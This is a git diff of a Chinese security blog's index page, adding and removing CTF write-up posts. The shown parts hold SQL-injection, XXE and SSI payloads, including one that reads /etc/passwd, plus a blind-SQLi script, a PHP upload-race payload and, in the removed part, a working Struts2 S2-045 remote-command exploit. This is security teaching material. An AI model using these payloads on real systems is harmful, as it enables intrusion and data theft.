@@ -292,6 +292,461 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/16/2018 高校网络信息安全管理运维挑战赛/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/16/2018 高校网络信息安全管理运维挑战赛/" itemprop="url">EIS-CTF2018</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-16T00:00:00+08:00">
+                2018-11-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="simpleBBS"><a href="#simpleBBS" class="headerlink" title="simpleBBS"></a>simpleBBS</h1><p>题目：<a href="http://bbs.sec.zju.edu.cn/" target="_blank" rel="noopener">http://bbs.sec.zju.edu.cn/</a></p>
+<p>进入网站 注册 登录</p>
+<p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/1dNLEfQayFdnJqhH4rN6kWsulozQzAJIWsmrASqSK6g!/b/dD4BAAAAAAAA&bo=1wUUAwAAAAADB.c!&rf=viewer_4" alt></p>
+<p>题目中没有任何提示，只说是简单的bbs（论坛）各种操作轮番上阵xss各种弹，没卵用，甚至右边有个文件上传测试，以为是文件上传，结果也没找到上传点，好吧放弃了，  </p>
+<p>那是不可能的，一翻py，fuzz，注册的时候会报错，<br><img src="https://i.imgur.com/7VAUrdK.png" alt><br>说明注册的时候需要加一个参数sn，抓包添加sn参数，注册成功。<br>不过给我最大的启发是这个页面报错，数据库，难道暗示着 数据库报错，注入？<br>试试 注册页面翻云覆雨的fuzz，好吧单引号过滤了，我注入你个螺旋大锤子。<br>？？不对，我登录页面给个单引号呢，经过一翻测试，必须要已经注册的账号加单引号才有效。<br>好的 测试开始，账号 username=xiaozhupeiqi1’&amp;password123456<br><img src="https://i.imgur.com/I1cK3FY.png" alt><br>这是啥？？数据库报错？好了，二话不说就是报错注入，<br><img src="https://i.imgur.com/q4WWKMq.png" alt><br>flag出来了，hiahiahia，提交，乔德麻袋？？flag咋不全，别担心换个函数<br>username=aaa’ and 1=updatexml(1,concat(0x3a,(select mid(flag,32,32) from flag) ,0x3a),1)–<br>OK了剩下的几位也出来了。此题 完！</p>
+<h1 id="SimpleExtensionExplorerInjection"><a href="#SimpleExtensionExplorerInjection" class="headerlink" title="SimpleExtensionExplorerInjection"></a>SimpleExtensionExplorerInjection</h1><p>请看题目，重点 xxe，后面是/flag，就是flag路径，</p>
+<p><img src="https://i.imgur.com/AbgQOg0.png" alt></p>
+<p>开局两个框，抓包!</p>
+<p><img src="https://i.imgur.com/nmCN9P7.png" alt></p>
+<p>我*？不是xml吗，你给我发个json格式包，你想做爪子？<br>不对，这是ctf，这很正常，佩奇老哥给你传个xml格式试试水，</p>
+<p><img src="https://i.imgur.com/QWDo2b3.png" alt></p>
+<p>牛皮，xml 数据可以传输，那么比较容易忽视的点来了，三个箭头的地方原本是json,既然要传输xml，一定要修改成xml，否则你做出来我吃*，<br>然后xxe,不会的请自行参考我的博客xxe，<br>来个payload 包，<br><img src="https://i.imgur.com/FHewbsx.png" alt><br>完结！</p>
+<h1 id="SimpleServerInjection"><a href="#SimpleServerInjection" class="headerlink" title="SimpleServerInjection"></a>SimpleServerInjection</h1><p><img src="https://i.imgur.com/1OvWuoO.png" alt></p>
+<p>重点，SSI 是服务器注入，拓展下，ssti是服务器模版注入，名字很像，利用方式有区别，然后flag在当前目录下，</p>
+<p>这道CTF题还是比较简单，但是需要点，点不对打死也做不出来，想复杂的话 更做不出来。</p>
+<p><img src="https://i.imgur.com/dWsKl24.png" alt></p>
+<p>payload </p>
+<pre><code>name=&lt;!--%23exec cmd=&quot;cat /etc/passwd&quot;--&gt;</code></pre><p>这里有个小点，如果是#浏览器会自动当成注释，不会解析发包，所以这里给编码%23<br>但是并没卵用，一开始以为会过滤了东西，但是看不出来哪过滤了，这个时候就要多尝试命令，<br>毕竟ssi有那么多命令<br>尝试过后使用 </p>
+<pre><code>name=&lt;!--%23include virtual=&quot;flag&quot;--&gt;</code></pre><p><img src="https://i.imgur.com/IdxrzN8.png" alt></p>
+<h1 id="SimpleBlog"><a href="#SimpleBlog" class="headerlink" title="SimpleBlog"></a>SimpleBlog</h1><p>题目，简单的blog,然后在classes给提示说是二次注入，一翻尝试之后无果，最后大佬给的思路，注意主页的提示<br>注意0分，final exam提交答卷会随机给一个成绩，既然说二次注入，会不会是看成绩的时候会把用户名啥的代入到数据库中，因为提交答卷分数插入到数据库，这里可能造成二次注入，即然这样那注入点就在用户名上面了，不断注册查看是否等于0，后来看wp晓得，当成绩为0时说明逻辑错误，不为0则逻辑正常。</p>
+<p><img src="https://i.imgur.com/OOd1kvu.png" alt></p>
+<p>然后注册 账号为 1’ or 1=1 or ‘</p>
+<p>账号这里有几个点着重说一下</p>
+<p>前面的1要单引号闭合，这句逻辑账号有三个语句要判断，第一个1’ 数据库中可能要查询啥不清楚后端代码，这里判断是错的，or 1=1 这个语句是对的， or’ 闭合语句这句也逻辑也是错的，所以我们 or判断只要是对的 那么分数查询那里就会是有分，否则就是0分。</p>
+<p>现在就可写脚本进行检测，首先确定好自己的 注入语句，这里是无法通过回显来注入的，所以我们通过布尔盲注写脚本。</p>
+<p>语句 zpq’ or ascii(substr((select flag from flag limit 0,1),1,1))&gt;1 or ‘</p>
+<p>查看效果 </p>
+<p><img src="https://i.imgur.com/QoxxXp2.png" alt></p>
+<p>语句 zpq’ or ascii(substr((select flag from flag limit 0,1),1,1))&gt;1000 or ‘</p>
+<p>这句 肯定为错，因为ascii码不可能大于1000</p>
+<p><img src="https://i.imgur.com/DD3Nya2.png" alt></p>
+<p>可以看到 返回为0说明是错误的，语句已经完成接下来就写个脚本跑出flag。</p>
+<pre><code>import requests
+import re
+
+
+headers = {
+&apos;Connection&apos;: &apos;close&apos;,
+}//防多次访问断开连接
+flag=&quot;&quot;
+for i in range(1,32):
+
+    for nmb in range(32,126):
+
+        payload={&apos;username&apos;:&quot;zpq888&apos; or ascii(substr((select flag from flag limit 0,1),%s,1))=%s or&apos;&quot;%(i,nmb),&apos;password&apos;:&quot;123&quot;}
+        s=requests.Session()
+        url_reg=&apos;http://210.32.4.20/register.php&apos;
+        r=s.post(url_reg,data=payload,headers=headers)
+        url_log=&apos;http://210.32.4.20/login.php&apos;
+        r=s.post(url_log,data=payload,headers=headers)
+        url_ans=&apos;http://210.32.4.20/answer.php&apos;
+        select={&apos;1.a&apos;:&apos;on&apos;}
+        r=s.post(url_ans,data=select,headers=headers)
+        result=r.content[2074:2075]
+        if int(result)!=0:
+            flag=flag+chr(nmb)
+            print flag
+            break</code></pre><p><img src="https://i.imgur.com/VbFQcqd.png" alt></p>
+<p>单线程太慢不跑了！</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/15/条件竞争漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/15/条件竞争漏洞/" itemprop="url">CTF中的条件竞争漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-15T00:00:00+08:00">
+                2018-11-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="条件竞争是沃特？"><a href="#条件竞争是沃特？" class="headerlink" title="条件竞争是沃特？"></a>条件竞争是沃特？</h1><p>敲黑板，定义：竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。</p>
+<p>开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。<br>线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区（critical section），如果没有应用好同步技术则会发生“竞争条件”问题。</p>
+<h1 id="形象实例"><a href="#形象实例" class="headerlink" title="形象实例"></a>形象实例</h1><p>#抽象成四个字，措手不及！！！</p>
+<p>利用多线程并发去执行同一个操作进程，服务器无法或者没有处理程序，导致处理高并发的线程未能同步好所有请求，导致请求与请求之间产生等待时出现逻辑缺陷。出现意想不到的结果，措手不及应接不暇人山人…咳咳，反应不过来就出错。</p>
+<p>该漏洞一般出现在与数据库系统频繁交互的位置，例如金额同步、支付等较敏感操作处。另外条件竞争漏洞也会出现在其他位置，例如文件的操作处理等。</p>
+<p>给两个例子好好消化消化。</p>
+<p>例1：金额提现</p>
+<p>假设现有一个用户在系统中共有2000元可以提现，他想全部提现。于是该用户同时发起两次提现请求，第一次提交请求提现2000元，系统已经创建了提现订单但还未来得及修改该用户剩余金额，此时第二次提现请求同样是提现2000元，于是程序在还未修改完上一次请求后的余额前就进行了余额判断，显然如果这里余额判断速度快于上一次余额修改速度，将会产生成功提现的两次订单，而数据库中余额也将变为-2000。而这产生的后果将会是平台多向该用户付出2000元。</p>
+<p>例2：先存储文件，再判断是否合法，然后再删除。</p>
+<p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室”<br>攻击：首先上传一个php文件<br>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。</p>
+<p>乌云实例：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2014-049794.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/bugs/wooyun-2014-049794.html</a></p>
+<p>乌云人民币套现：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-099622.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-099622.html</a></p>
+<h1 id="CTF实例"><a href="#CTF实例" class="headerlink" title="CTF实例"></a>CTF实例</h1><p><a href="https://blog.csdn.net/iamsongyu/article/details/83346029" target="_blank" rel="noopener">https://blog.csdn.net/iamsongyu/article/details/83346029</a>  //Itshop<br>辣条之王 知识点1.条件竞争 2.数据溢出<br>数据溢出重点一句话：我们输入的是份数，后台肯定要查询数据库中我们的大辣条数目书否符合条件，即是否大于份数*5，才会给我们相应的辣条之王。我们的目的是数据库判断可以过，但是后台也得给我们足够的辣条之王，思路是使用整数溢出欺骗数据库，（重中）使得我们请求的数字在服务器看来就是1分辣条之王，而实际上是很多。（之重！）</p>
+<p>ctf题目：<a href="http://119.23.73.3:5006/web2/index2.php" target="_blank" rel="noopener">http://119.23.73.3:5006/web2/index2.php</a> （练习）</p>
+<p>首先进入CTF地址，观察发现，网址为inde2.php，<br>正常来说应是index.php，访问index.php发现自动跳转 inde2.php<br>抓包截包，<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/xETNIjlX1VaS797xJsurCrQx*Q1ApmzzlyDieOTRefo!/b/dFQBAAAAAAAA&bo=ZAUTAQAAAAADB1E!&rf=viewer_4" alt><br>进入 uploadsomething.php，发现应该是个上传页面，第一个框为上传文件名，第二个为文件内容，<br>上传1.php ，返回路径 查看<br><img src="http://a3.qpic.cn/psb?/V14K5DCn3C6bNV/nyq3Vv.Nd1vPT*R2*b16gy6sUIRZ8JShmvZCS.jWugM!/b/dDYBAAAAAAAA&ek=1&kp=1&pt=0&bo=lAM8AQAAAAADF5g!&tl=1&vuin=275640346&tm=1542283200&sce=60-1-1&rf=viewer_4" alt><br>凭我专业八级的英语水平，这意思应该是太慢了，于是聪明的你想到的条件竞争漏洞，迅速上传迅速访问。<br>OK，使用burp intruder 模块 爆破上传，然后访问。</p>
+<p>于是，开始，</p>
+<p>分别抓取两个包发送intruder<br>第一个包网址：<a href="http://119.23.73.3:5006/web2/uploadsomething.php?filename=1.php&amp;content=" target="_blank" rel="noopener">http://119.23.73.3:5006/web2/uploadsomething.php?filename=1.php&amp;content=</a><?php+system("ls");?><br>第二个包网址：<a href="http://119.23.73.3:5006/web2/uploads/c2a54d18d324f0c9b33b29243f77d3a45b5f9463/1.php" target="_blank" rel="noopener">http://119.23.73.3:5006/web2/uploads/c2a54d18d324f0c9b33b29243f77d3a45b5f9463/1.php</a>  </p>
+<p>调整没有字典的爆破，不断发包，<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/92EEmEGiQ0C9aXOxUWeka.bNZZLQumQIQVxYL1XQT0w!/b/dFMBAAAAAAAA&bo=dwIGAgAAAAADF0M!&rf=viewer_4" alt></p>
+<p>然后设置发送三千个数据包，然后设置线程调至50<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/ZAi8Xtt*f4ZroqWHIvkjTlaHt9N55rzwdZhEfK1o140!/b/dFMBAAAAAAAA&bo=kAJRAQAAAAADB.A!&rf=viewer_4" alt></p>
+<p>第一个包为以50线程迅速上传三千次，<br>第二个包为以50线程迅速访问三千次，只要速度够快就可以访问到。<br>然后开始爆破成功得到flag，我们可以看到也不是百分百可以得到flag，存在竞争，<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/3vhqtv7o0Rl.3VVfujdaCSFhbhJQZ2929itgTVpf05Y!/b/dFQBAAAAAAAA&bo=1gUgAgAAAAADB9M!&rf=viewer_4" alt></p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>对于数据库的操作，正牌的方法是设置锁</p>
+<p>对于文件上传，一定要经过充分完整的检查之后再上传而不是先上传在辨别。</p>
+<hr>
+<p>参考：<a href="https://blog.csdn.net/ivalue/article/details/81412494" target="_blank" rel="noopener">https://blog.csdn.net/ivalue/article/details/81412494</a><br>参考：<a href="https://www.0dayhack.com/post-666.html" target="_blank" rel="noopener">https://www.0dayhack.com/post-666.html</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/14/CTF-web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小猪佩奇">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-Communication">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/14/CTF-web/" itemprop="url">CTF-WEB知识点保存</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-14T00:00:00+08:00">
+                2018-11-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="nginx-配置不当导致目录遍历下载漏洞"><a href="#nginx-配置不当导致目录遍历下载漏洞" class="headerlink" title="nginx 配置不当导致目录遍历下载漏洞"></a>nginx 配置不当导致目录遍历下载漏洞</h1><p><a href="http://www.cnblogs.com/Mrsm1th/p/6600876.html" target="_blank" rel="noopener">http://www.cnblogs.com/Mrsm1th/p/6600876.html</a></p>
+<h1 id="php-input代码执行以及php-filter读取源码"><a href="#php-input代码执行以及php-filter读取源码" class="headerlink" title="php:input代码执行以及php://filter读取源码"></a>php:input代码执行以及php://filter读取源码</h1><p><a href="https://www.ichunqiu.com/writeup/detail/481" target="_blank" rel="noopener">https://www.ichunqiu.com/writeup/detail/481</a></p>
+<h1 id="一道python简单编写–保持session情况下爆破"><a href="#一道python简单编写–保持session情况下爆破" class="headerlink" title="一道python简单编写–保持session情况下爆破"></a>一道python简单编写–保持session情况下爆破</h1><p><a href="https://www.ichunqiu.com/writeup/detail/345" target="_blank" rel="noopener">https://www.ichunqiu.com/writeup/detail/345</a></p>
+<p>附脚本</p>
+<pre><code>import requests
+
+url=&apos;http://ffefac91283449f885270558d30fea4476d8e21e00254600.game.ichunqiu.com/?value[]=ea&apos;
+
+s=requests.session()//一个要点必须保持session一致否则销毁了之后无法叠加十次。
+
+r=s.get(url)
+for i in range(0,20):
+    url=&quot;http://ffefac91283449f885270558d30fea4476d8e21e00254600.game.ichunqiu.com/?value[]=&quot;+r.content[0:2]
+    r=s.get(url)
+    print r.content[0:44]</code></pre><h1 id="PHP超全局变量CTF"><a href="#PHP超全局变量CTF" class="headerlink" title="PHP超全局变量CTF"></a>PHP超全局变量CTF</h1><p><a href="https://www.ichunqiu.com/writeup/detail/717" target="_blank" rel="noopener">https://www.ichunqiu.com/writeup/detail/717</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/11/SSTI模板注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1962,661 +2417,6 @@ node()    匹配任何类型的节点。</code></pre><h2 id="Xpath注入攻击�
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/13/S2-045漏洞脚本cmd/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="小猪佩奇">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.ico">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sec-Communication">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/13/S2-045漏洞脚本cmd/" itemprop="url">S2-045脚本</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-13T00:00:00+08:00">
-                2018-09-13
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>#不BB贴脚本</p>
-<pre><code>#!/usr/bin/python
-# -*- coding: utf-8 -*-
-
-import urllib2
-import httplib
-url=&quot;http://192.168.2.203/login.action&quot;
-def exploit(url, cmd):
-    payload = &quot;%{(#_=&apos;multipart/form-data&apos;).&quot;
-    payload += &quot;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).&quot;
-    payload += &quot;(#_memberAccess?&quot;
-    payload += &quot;(#_memberAccess=#dm):&quot;
-    payload += &quot;((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).&quot;
-    payload += &quot;(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).&quot;
-    payload += &quot;(#ognlUtil.getExcludedPackageNames().clear()).&quot;
-    payload += &quot;(#ognlUtil.getExcludedClasses().clear()).&quot;
-    payload += &quot;(#context.setMemberAccess(#dm)))).&quot;
-    payload += &quot;(#cmd=&apos;%s&apos;).&quot; % cmd
-    payload += &quot;(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).&quot;
-    payload += &quot;(#cmds=(#iswin?{&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd}:{&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd})).&quot;
-    payload += &quot;(#p=new java.lang.ProcessBuilder(#cmds)).&quot;
-    payload += &quot;(#p.redirectErrorStream(true)).(#process=#p.start()).&quot;
-    payload += &quot;(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).&quot;
-    payload += &quot;(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).&quot;
-    payload += &quot;(#ros.flush())}&quot;
-    try:
-        headers = {&apos;User-Agent&apos;: &apos;Mozilla/5.0&apos;, &apos;Content-Type&apos;: payload}
-        request = urllib2.Request(url, headers=headers)
-        page = urllib2.urlopen(request).read()
-    except httplib.IncompleteRead, e:
-        page = e.partial
-
-    print(page)
-    return page
-
-command=raw_input(&quot;pleace put you command:&quot;)
-
-exploit(url,command)</code></pre><p>脚本效果：<br><img src="http://thyrsi.com/t6/369/1536825376x-1404729710.png" alt></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/02/CTF-python/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="小猪佩奇">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.ico">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sec-Communication">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/02/CTF-python/" itemprop="url">CTF-python练习</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-02T00:00:00+08:00">
-                2018-09-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="BUGKU-速度要快"><a href="#BUGKU-速度要快" class="headerlink" title="BUGKU-速度要快"></a>BUGKU-速度要快</h1><p><b>题目网址:<a href="http://120.24.86.145:8002/web6/" target="_blank" rel="noopener">http://120.24.86.145:8002/web6/</a></b>  </p>
-<p>速度要快，查看源码，暗示要post传递一个参数，先抓包，发现headers头有flag，需要base64解码。<br>然后post传递参数返回flag。</p>
-<p>贴出源码：</p>
-<pre><code>import requests
-from base64 import b64decode
-s=requests.Session() #保证一个session这样才能根据给出的随机flag匹配最终flag
-a=s.get(&apos;http://120.24.86.145:8002/web6/&apos;).headers[&apos;flag&apos;]
-flag=b64decode(a).decode()#解码headers中的flag，但是解码出来需要decode再次解码。
-key=b64decode(flag.split(&apos;:&apos;)[1])#解码出内容为：跑的还不错，给你flag吧: ODgzMTc= ，需要截取:右边内容所以用到split截取以冒号分割的第二个内容。
-payload={&apos;margin&apos;:key}
-r=s.post(&apos;http://120.24.86.145:8002/web6/&apos;,data=payload)
-print(r.text)</code></pre><h1 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h1><p><b>题目网址：<a href="http://ctf5.shiyanbar.com/web/10/10.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/10/10.php</a></b></p>
-<p>贴出源码：</p>
-<pre><code>url=&apos;http://ctf5.shiyanbar.com/web/10/10.php&apos;
-s=requests.Session()#保证一个session会话
-res=base64.b64decode(s.get(url).headers[&apos;flag&apos;]).decode()#对flag进行解码编码等操作
-a=res.split(&apos;:&apos;)[1]#分离出需要的信息
-payload={&apos;key&apos;:a}
-b=s.post(url,data=payload)
-print(b.text)</code></pre><p>思路 抓包 源码 解码64 脚本post发包</p>
-<h1 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h1><p><b><a href="http://120.24.86.145:8002/qiumingshan/" target="_blank" rel="noopener">http://120.24.86.145:8002/qiumingshan/</a></b></p>
-<p>贴出源码：</p>
-<pre><code>url=&apos;http://120.24.86.145:8002/qiumingshan/&apos;
-s=requests.Session()#保证在极短时间内提交是一个会话
-r=s.get(url)#get url里的表达式
-matchp=re.search(r&apos;(\d+[+\-*]+)+\d+&apos;,r.text).group()
-res=eval(matchp)
-data={&apos;value&apos;:res}
-result = s.post(url,data=data)
-print(result.text)</code></pre><p>很单纯的一道python脚本计算题目,  </p>
-<p>，group()为打印出此表达式给matchp，用正则表达式，\d+表示一个或者多个数字，[]里为任意一个字符，这里为匹配+-*，-需要转义，将这两项括号括起来+，这样才可以匹配多个这样类型的表达式，最后加上一个\d+。</p>
-<p>eval(expression, globals=None, locals=None)  — 官方文档中的解释是，将字符串str当成有效的表达式来求值并返回计算结果。globals和locals参数是可选的，如果提供了globals参数，那么它必须是dictionary类型；如果提供了locals参数，那么它可以是任意的map对象。</p>
-<p>最后post传递得到flag，</p>
-<pre><code>import hashlib
-def md5(data):
-    m=hashlib.md5()
-    m.update(data)
-    a=m.hexdigest()
-    return a
-a=&apos;ichunqiu&apos;
-b=&apos;abcdefghijklmnopqrstuvwxyz1234567890&apos;
-for i in b:
-    for j in b:
-       for k in b:
-            for l in b:
-                for m in b:
-                    if md5(a+i+j+k+l+m)==&apos;5a2a7d385fdaad3fabbe7b11c28bd48e&apos;:
-                        print a+i+j+k+l+m</code></pre><p>要破解ichunqiu 后面的后五位然后 post传递</p>
-<p>传送门：<a href="https://ciphersaw.me/2017/12/16/%E8%AF%A6%E8%A7%A3%20CTF%20Web%20%E4%B8%AD%E7%9A%84%E5%BF%AB%E9%80%9F%E5%8F%8D%E5%BC%B9%20POST%20%E8%AF%B7%E6%B1%82/" target="_blank" rel="noopener">文章</a></p>
-<hr>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/02/正则基础/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="小猪佩奇">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.ico">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sec-Communication">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/02/正则基础/" itemprop="url">正则表达式基础</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
